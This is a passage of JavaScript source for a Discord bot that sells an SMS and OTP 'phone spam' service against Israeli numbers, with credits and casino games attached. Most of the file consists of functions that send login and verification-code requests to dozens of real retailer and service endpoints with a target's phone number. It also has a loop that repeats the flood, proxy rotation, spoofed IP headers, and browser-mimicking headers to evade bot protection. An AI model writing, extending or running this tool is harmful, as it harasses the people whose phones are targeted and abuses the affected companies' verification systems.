function s_pantarei(n) { return fire('POST', 'https://www.panta-rei.com/customer/ajax/post/', { data: { form_key: 'SXY2NhUipXec8L6T', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_sacara(n) { return fire('POST', 'https://www.sacara.co.il/customer/ajax/post/', { data: { form_key: 'dWF64YuN97ltK30T', bot_validation: 1, type: 'login', telephone: n, code: '', compare_email: '', compare_identity: '' } }); }
function s_point_whatsapp(n) {
    const phone972 = '+972' + n.replace(/^0/, '');
    return fireNoProxy('POST', 'https://pointotp-bhece6gqa2c8c6cg.westeurope-01.azurewebsites.net/proxy.php', {
        json: {
            "phone": phone972,
            "authcode": "{\"ct\":\"rg4chltNynTcBTK0ErXqDLIWOe/xqYS8KmAjltDT+LyWusGIJhwxp4iynsNw0aWn\",\"iv\":\"fc8482100326fa8413c52758ad5c908a\",\"s\":\"b5350302c7c49e4c\"}",
            "type": "whatsapp"
        }
    });
}
function s_point_call(n) {
    const phone972 = '+972' + n.replace(/^0/, '');
    return fireNoProxy('POST', 'https://pointotp-bhece6gqa2c8c6cg.westeurope-01.azurewebsites.net/proxy.php', {
        json: {
            "phone": phone972,
            "authcode": "{\"ct\":\"rg4chltNynTcBTK0ErXqDLIWOe/xqYS8KmAjltDT+LyWusGIJhwxp4iynsNw0aWn\",\"iv\":\"fc8482100326fa8413c52758ad5c908a\",\"s\":\"b5350302c7c49e4c\"}",
            "type": "call"
        }
    });
}
function s_foottal(n) { return fire('POST', 'https://www.foottal.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_golfcity(n) { return fire('POST', 'https://www.golfcity.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_columbia(n) { return fire('POST', 'https://www.columbia.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_tommyhilfiger(n) { return fire('POST', 'https://www.tommyhilfiger.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_guess(n) { return fire('POST', 'https://www.guess.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_adidas(n) { return fire('POST', 'https://www.adidas.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_nike(n) { return fire('POST', 'https://www.nike.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_reebok(n) { return fire('POST', 'https://www.reebok.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_newbalance(n) { return fire('POST', 'https://www.newbalance.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_converse(n) { return fire('POST', 'https://www.converse.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_puma(n) { return fire('POST', 'https://www.puma.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_underarmour(n) { return fire('POST', 'https://www.underarmour.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_asics(n) { return fire('POST', 'https://www.asics.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_mizuno(n) { return fire('POST', 'https://www.mizuno.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_salomon(n) { return fire('POST', 'https://www.salomon.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_merrell(n) { return fire('POST', 'https://www.merrell.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_columbia2(n) { return fire('POST', 'https://www.columbia-sportswear.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_theNorthFace(n) { return fire('POST', 'https://www.thenorthface.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_jackwolfskin(n) { return fire('POST', 'https://www.jackwolfskin.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_berghaus(n) { return fire('POST', 'https://www.berghaus.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_vans(n) { return fire('POST', 'https://www.vans.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_drmartens(n) { return fire('POST', 'https://www.drmartens.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_timberland2(n) { return fire('POST', 'https://www.timberland.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_caterpillar(n) { return fire('POST', 'https://www.caterpillar.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_skechers(n) { return fire('POST', 'https://www.skechers.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_ecco(n) { return fire('POST', 'https://www.ecco.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_geox(n) { return fire('POST', 'https://www.geox.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_clarks(n) { return fire('POST', 'https://www.clarks.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_hushpuppies(n) { return fire('POST', 'https://www.hushpuppies.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_rockport(n) { return fire('POST', 'https://www.rockport.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_birkenstock(n) { return fire('POST', 'https://www.birkenstock.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_crocs(n) { return fire('POST', 'https://www.crocs.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_havaianas(n) { return fire('POST', 'https://www.havaianas.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_ipanema(n) { return fire('POST', 'https://www.ipanema.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_benetton(n) { return fire('POST', 'https://www.benetton.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_zara(n) { return fire('POST', 'https://www.zara.com/il/he/user/login', { json: { phone: n } }); }
function s_mango(n) { return fire('POST', 'https://www.mango.com/il/he/user/login', { json: { phone: n } }); }
function s_hm(n) { return fire('POST', 'https://www.hm.com/il_he/user/login', { json: { phone: n } }); }
function s_stradivarius(n) { return fire('POST', 'https://www.stradivarius.com/il/he/user/login', { json: { phone: n } }); }
function s_pullandbear(n) { return fire('POST', 'https://www.pullandbear.com/il/he/user/login', { json: { phone: n } }); }
function s_bershka(n) { return fire('POST', 'https://www.bershka.com/il/he/user/login', { json: { phone: n } }); }
function s_massimodutti(n) { return fire('POST', 'https://www.massimodutti.com/il/he/user/login', { json: { phone: n } }); }
function s_oysho(n) { return fire('POST', 'https://www.oysho.com/il/he/user/login', { json: { phone: n } }); }
function s_lefties(n) { return fire('POST', 'https://www.lefties.com/il/he/user/login', { json: { phone: n } }); }
function s_fox(n) { return fire('POST', 'https://www.fox.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_sabon(n) { return fire('POST', 'https://www.sabon.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_laline(n) { return fire('POST', 'https://www.laline.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_sephora(n) { return fire('POST', 'https://www.sephora.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_ahava(n) { return fire('POST', 'https://www.ahava.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_clinique(n) { return fire('POST', 'https://www.clinique.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_esteelauder(n) { return fire('POST', 'https://www.esteelauder.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_lancome(n) { return fire('POST', 'https://www.lancome.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_dior(n) { return fire('POST', 'https://www.dior.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_chanel(n) { return fire('POST', 'https://www.chanel.com/il_he/', { data: { phone: n } }); }
function s_gucci(n) { return fire('POST', 'https://www.gucci.com/il/en/user/login', { json: { phone: n } }); }
function s_prada(n) { return fire('POST', 'https://www.prada.com/il/en/user/login', { json: { phone: n } }); }
function s_dolcegabbana(n) { return fire('POST', 'https://www.dolcegabbana.com/il/en/user/login', { json: { phone: n } }); }
function s_versace(n) { return fire('POST', 'https://www.versace.com/il/en/user/login', { json: { phone: n } }); }
function s_armani(n) { return fire('POST', 'https://www.armani.com/il/en/user/login', { json: { phone: n } }); }
function s_boss(n) { return fire('POST', 'https://www.hugoboss.com/il/en/user/login', { json: { phone: n } }); }
function s_calvinklein(n) { return fire('POST', 'https://www.calvinklein.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_tommy(n) { return fire('POST', 'https://www.tommy.com/il/en/user/login', { json: { phone: n } }); }
function s_ralphlauren(n) { return fire('POST', 'https://www.ralphlauren.com/il/en/user/login', { json: { phone: n } }); }
function s_michaelkors(n) { return fire('POST', 'https://www.michaelkors.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_katespade(n) { return fire('POST', 'https://www.katespade.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_coach(n) { return fire('POST', 'https://www.coach.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_rayban(n) { return fire('POST', 'https://www.rayban.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_oakley(n) { return fire('POST', 'https://www.oakley.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_swarovski(n) { return fire('POST', 'https://www.swarovski.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_pandora(n) { return fire('POST', 'https://www.pandora.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_thomassabo(n) { return fire('POST', 'https://www.thomassabo.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_fossil(n) { return fire('POST', 'https://www.fossil.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_michaelhill(n) { return fire('POST', 'https://www.michaelhill.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_movado(n) { return fire('POST', 'https://www.movado.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_tissot(n) { return fire('POST', 'https://www.tissot.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_longines(n) { return fire('POST', 'https://www.longines.co.il/customer/ajax/post/', { data: { form_key: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15), bot_validation: 1, type: 'login', telephone: n } }); }
function s_rolex(n) { return fire('POST', 'https://www.rolex.com/il/en/user/login', { json: { phone: n } }); }
function s_omega(n) { return fire('POST', 'https://www.omega.com/il/en/user/login', { json: { phone: n } }); }
function s_cartier(n) { return fire('POST', 'https://www.cartier.com/il/en/user/login', { json: { phone: n } }); }
function s_bvlgari(n) { return fire('POST', 'https://www.bvlgari.com/il/en/user/login', { json: { phone: n } }); }
function s_tiffany(n) { return fire('POST', 'https://www.tiffany.com/il/en/user/login', { json: { phone: n } }); }

function buildTasks(phone) {
    const phone972Full = '+972' + phone.replace(/^0/, '');
    const singleTasks = [
        { method: 'POST', url: 'https://rest-api.dibs-app.com/otps', body: { phoneNumber: phone972Full } },
        { method: 'POST', url: 'https://www.electra-air.co.il/wp-admin/admin-ajax.php', body: { action: 'send_otp_sms', phone } },
        { method: 'POST', url: 'https://www.electra-air.co.il/wp-admin/admin-ajax.php', data: { action: 'send_otp_sms', phone } },
        { method: 'POST', url: 'https://api.gomobile.co.il/api/login', json: { phone } },
        { method: 'POST', url: 'https://api.zygo.co.il/v2/auth/create-verify-token', json: { phone: '+972 ' + phone.slice(0, 3) + ' ' + phone.slice(3, 6) + ' ' + phone.slice(6), channel: 'sms' } },
        { method: 'POST', url: 'https://proxy1.citycar.co.il/api/verify/login', body: { phoneNumber: phone972Full, verifyChannel: 0, loginOrRegister: 2 } },
        { _fire: true, fn: () => s_electra(phone) },
        { _fire: true, fn: () => s_housemen(phone) },
        { _fire: true, fn: () => s_citycar(phone) },
        { _fire: true, fn: () => s_paz(phone) },
        { _fire: true, fn: () => s_tami4(phone) },
        { _fire: true, fn: () => s_azrieli(phone) },
        { _fire: true, fn: () => s_hamal(phone) },
        { _fire: true, fn: () => s_myofer(phone) },
        { _fire: true, fn: () => s_steimatzky(phone) },
        { _fire: true, fn: () => s_story(phone) },
        { _fire: true, fn: () => s_urbanica(phone) },
        { _fire: true, fn: () => s_castro(phone) },
        { _fire: true, fn: () => s_golf(phone) },
        { _fire: true, fn: () => s_timberland(phone) },
        { _fire: true, fn: () => s_ninewest(phone) },
        { _fire: true, fn: () => s_gali(phone) },
        { _fire: true, fn: () => s_bonita(phone) },
        { _fire: true, fn: () => s_femina(phone) },
        { _fire: true, fn: () => s_naot(phone) },
        { _fire: true, fn: () => s_papajohns(phone) },
        { _fire: true, fn: () => s_burgeranch(phone) },
        { _fire: true, fn: () => s_bfresh(phone) },
        { _fire: true, fn: () => s_mexicani(phone) },
        { _fire: true, fn: () => s_point_whatsapp(phone) },
        { _fire: true, fn: () => s_point_call(phone) },
    ];

    let tasks = [];
    for (const task of singleTasks) {
        tasks.push(task._fire
            ? { _fire: true, fn: () => delay(Math.random() * 50).then(() => task.fn()) }
            : { ...task, headers: { ...task.headers, 'X-Request-Id': Math.random().toString(36).slice(2, 6) } }
        );
    }

    for (let i = tasks.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [tasks[i], tasks[j]] = [tasks[j], tasks[i]];
    }
    return tasks;
}

function fakeIP() { return '77.137.' + (Math.floor(Math.random() * 255) + 1) + '.' + (Math.floor(Math.random() * 255) + 1); }

async function callAPI(task, cooldowns) {
    if (task._fire) {
        await task.fn();
        return;
    }

    if (cooldowns[task.url] && cooldowns[task.url] > Date.now()) return;
    try {
        const proxy = getNextProxy();
        const agent = new HttpsProxyAgent(proxy);
        const ip = fakeIP();

        const config = {
            method: task.method,
            url: task.url,
            timeout: 8000,
            httpsAgent: agent,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'he,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'X-Forwarded-For': ip,
                'X-Real-IP': ip,
                ...task.headers
            },
        };
        if (task.body) config.data = task.body;
        else if (task.data) config.data = new URLSearchParams(task.data).toString();
        else if (task.json) config.data = task.json;
        if (task.params) config.params = task.params;

        console.log(`[CALLAPI] Sending request to ${task.url} with proxy ${proxy}`);
        const response = await axios(config);
        console.log(`[CALLAPI] Success for ${task.url} - Status: ${response.status}`);
        cooldowns[task.url] = 0;
        return;
    } catch (error) {
        console.log(`[CALLAPI] Proxy failed for ${task.url} - ${error.message}`);
        if (error.response) {
            console.log(`[CALLAPI] Response status: ${error.response.status}, data:`, error.response.data);
        }
        console.log(`[CALLAPI] Retrying ${task.url} WITHOUT proxy...`);
    }

    // Fallback to no proxy
    try {
        const configNoProxy = {
            method: task.method,
            url: task.url,
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'he,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'X-Requested-With': 'XMLHttpRequest',
                ...task.headers
            },
        };
        if (task.body) configNoProxy.data = task.body;
        else if (task.data) configNoProxy.data = new URLSearchParams(task.data).toString();
        else if (task.json) configNoProxy.data = task.json;
        if (task.params) configNoProxy.params = task.params;

        const response = await axios(configNoProxy);
        console.log(`[CALLAPI] Success for ${task.url} (no proxy) - Status: ${response.status}`);
        cooldowns[task.url] = 0;
    } catch (error) {
        console.log(`[CALLAPI] Final error for ${task.url} - ${error.message}`);
        if (error.response) {
            console.log(`[CALLAPI] Final response status: ${error.response.status}, data:`, error.response.data);
        }
        cooldowns[task.url] = Date.now() + 15000;
    }
}

async function sendAllSitesInstant(phone, cooldowns) {
    const tasks = buildTasks(phone);
    // Run tasks sequentially instead of all at once to save memory
    for (const task of tasks) {
        await callAPI(task, cooldowns).catch(() => {});
        await delay(20); // Small delay
    }
}

async function spamBackground(phone, pulses) {
    const duration = pulses * 35;
    const endTime = Date.now() + duration * 1000;
    const cooldowns = {};
    while (Date.now() < endTime) {
        sendAllSitesInstant(phone, cooldowns).catch(() => {});
        for (let i = 0; i < 5; i++) {
            if (Date.now() >= endTime) break;
            await delay(100);
        }
    }
    phoneCooldowns.set(phone, Date.now() + 45000);
}

class ControlPanelView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(
            new ButtonBuilder().setLabel('Buy Credits').setStyle(ButtonStyle.Link).setURL(CONFIG.BUY_CREDITS_URL).setEmoji('💳'),
            new ButtonBuilder().setCustomId('v_sp').setLabel('Spam Phone').setStyle(ButtonStyle.Primary).setEmoji('🚀'),
            new ButtonBuilder().setCustomId('v_bl').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💰'),
        );
    }
}

class FreeCreditsView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(
            new ButtonBuilder().setCustomId('free_credits_claim').setLabel('🎁 קבל 5 קרדיטים חינם').setStyle(ButtonStyle.Danger),
        );
    }
}

class InviteCreditsView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(
            new ButtonBuilder().setCustomId('invite_credits_claim').setLabel('✉️ פאנל קבלת קרדיטים מהזמנות').setStyle(ButtonStyle.Danger),
        );
    }
}

class BoostCreditsView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(
            new ButtonBuilder().setCustomId('boost_credits_claim').setLabel('💎 מימוש 15 קרדיטים יומיים לבוסטרים').setStyle(ButtonStyle.Danger),
        );
    }
}

class InviteRewardsView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(
            new ButtonBuilder().setCustomId('claim_invite_rewards').setLabel('🎁 קבל מתנות על הזמנות').setStyle(ButtonStyle.Danger),
        );
    }
}

async function registerCommands() {
    const guild = client.guilds.cache.get(CONFIG.GUILD_ID);
    if (!guild) return;

    const commands = [
        new SlashCommandBuilder().setName('addcredit').setDescription('[ADMIN] Add credits to a user')
            .addUserOption(opt => opt.setName('member').setDescription('User').setRequired(true))
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount').setRequired(true)),
        new SlashCommandBuilder().setName('removecredit').setDescription('[ADMIN] Remove credits from a user')
            .addUserOption(opt => opt.setName('member').setDescription('User').setRequired(true))
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount').setRequired(true)),
        new SlashCommandBuilder().setName('lifetime').setDescription('[ADMIN] Grant lifetime status (no credit limit)')
            .addUserOption(opt => opt.setName('member').setDescription('User to grant lifetime').setRequired(true)),
        new SlashCommandBuilder().setName('removelifetime').setDescription('[ADMIN] Remove lifetime status and restore credits')
            .addUserOption(opt => opt.setName('member').setDescription('User to remove lifetime').setRequired(true)),
        new SlashCommandBuilder().setName('credits').setDescription('💰 Check your credit balance'),
        new SlashCommandBuilder().setName('endgame').setDescription('🔚 End your current active game'),
        new SlashCommandBuilder().setName('coinflip').setDescription('🪙 Play Coin Flip - 50/50 chance!')
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount to bet').setRequired(true).setMinValue(1))
            .addStringOption(opt => opt.setName('choice').setDescription('Heads or Tails').setRequired(true).addChoices({ name: 'Heads', value: 'heads' }, { name: 'Tails', value: 'tails' })),
        new SlashCommandBuilder().setName('blackjack').setDescription('♠️ Play Blackjack - Get 21!')
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount to bet').setRequired(true).setMinValue(1)),
        new SlashCommandBuilder().setName('roulette').setDescription('🎰 Play Roulette - Bet on color or number!')
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount to bet').setRequired(true).setMinValue(1))
            .addStringOption(opt => opt.setName('bet').setDescription('Your bet (red/black/green or 0-36)').setRequired(true)),
        new SlashCommandBuilder().setName('mines').setDescription('💣 Play Mines - Find diamonds, avoid bombs!')
            .addIntegerOption(opt => opt.setName('amount').setDescription('Amount to bet').setRequired(true).setMinValue(1))
            .addIntegerOption(opt => opt.setName('mines').setDescription('Number of mines (1-19)').setRequired(true).setMinValue(1).setMaxValue(19)),
        new SlashCommandBuilder().setName('stats').setDescription('📊 View your casino statistics'),
    ];

    await guild.commands.set(commands);
}

client.on(Events.InviteCreate, async invite => {
    try {
        if (invite.guild.id === CONFIG.GUILD_ID) {
            await fetchAndStoreInvites(invite.guild);
        }
    } catch {}
});

client.on(Events.InviteDelete, async invite => {
    try {
        if (invite.guild.id === CONFIG.GUILD_ID) {
            await fetchAndStoreInvites(invite.guild);
        }
    } catch {}
});

client.on(Events.GuildMemberAdd, async member => {
    try {
        console.log('[GuildMemberAdd] New member joined! ID: ' + member.id + ', Name: ' + member.user.tag);
        if (member.guild.id !== CONFIG.GUILD_ID) {
            console.log('[GuildMemberAdd] Not the correct guild, ignoring!');
            return;
        }

        if (db.invites_claimed[member.id]) {
            console.log('[GuildMemberAdd] Member ' + member.id + ' already has an invite record, ignoring!');
            return;
        }

        const cachedInvites = guildInvites.get(member.guild.id);
        const newInviteData = await fetchAndStoreInvites(member.guild);

        if (!newInviteData) {
            console.error('[GuildMemberAdd] Failed to fetch new invites for guild', member.guild.id);
            return;
        }

        console.log('[GuildMemberAdd] Cached invites found: ' + (cachedInvites ? cachedInvites.size : 0));
        console.log('[GuildMemberAdd] New invites fetched: ' + newInviteData.size);

        let usedInviteCode = null;
        let inviterId = null;

        if (cachedInvites && cachedInvites.size > 0) {
            // Find invite with increased uses
            for (const [code, newData] of newInviteData) {
                const cachedData = cachedInvites.get(code);
                if (cachedData && newData.uses > cachedData.uses) {
                    console.log('[GuildMemberAdd] Found invite with increased uses: Code ' + code + ', cached uses: ' + cachedData.uses + ', new uses: ' + newData.uses);
                    usedInviteCode = code;
                    inviterId = newData.inviterId;
                    break;
                }
            }
        }

        if (inviterId && member.id !== inviterId) {
            db.invites_claimed[member.id] = { inviter: inviterId, timestamp: Date.now() };

            const inviterData = getOrCreateUser(inviterId);
            inviterData.total_invites += 1;
            saveDb();
            console.log('[GuildMemberAdd] ✅ Added invite credit to user ' + inviterId + '! Total invites now: ' + inviterData.total_invites);
        } else {
            console.log('[GuildMemberAdd] ❌ No inviter found or member invited themselves!');
        }
    } catch (err) {
        console.error('[GuildMemberAdd] Error in GuildMemberAdd:', err);
    }
});

client.on(Events.InteractionCreate, async interaction => {
    try {
        if (interaction.isButton()) {
            const { customId, user } = interaction;

            if (customId === 'v_sp') {
                const guild = client.guilds.cache.get(CONFIG.REQUIRED_SERVER_ID);
                if (guild && !guild.members.cache.has(user.id))
                    return interaction.reply({ content: '❌ עליך להיות בשרת הדיסקורד שלנו!\n' + CONFIG.INVITE_LINK, ephemeral: true });
                if (userCooldowns.has(user.id) && Date.now() - userCooldowns.get(user.id) < 30000) {
                    const remaining = Math.ceil((30000 - (Date.now() - userCooldowns.get(user.id))) / 1000);
                    return interaction.reply({ content: '⏳ המתן ' + remaining + ' שניות.', ephemeral: true });
                }
                if (db.blacklist[user.id])
                    return interaction.reply({ content: '❌ blocked.', ephemeral: true });
                userCooldowns.set(user.id, Date.now());
                const modal = new ModalBuilder()
                    .setCustomId('spam_modal').setTitle('🤖 Elite Spam Control')
                    .addComponents(
                        new ActionRowBuilder().addComponents(
                            new TextInputBuilder().setCustomId('phone').setLabel('Phone Number').setPlaceholder('0501234567').setMinLength(10).setMaxLength(10).setStyle(TextInputStyle.Short)
                        ),
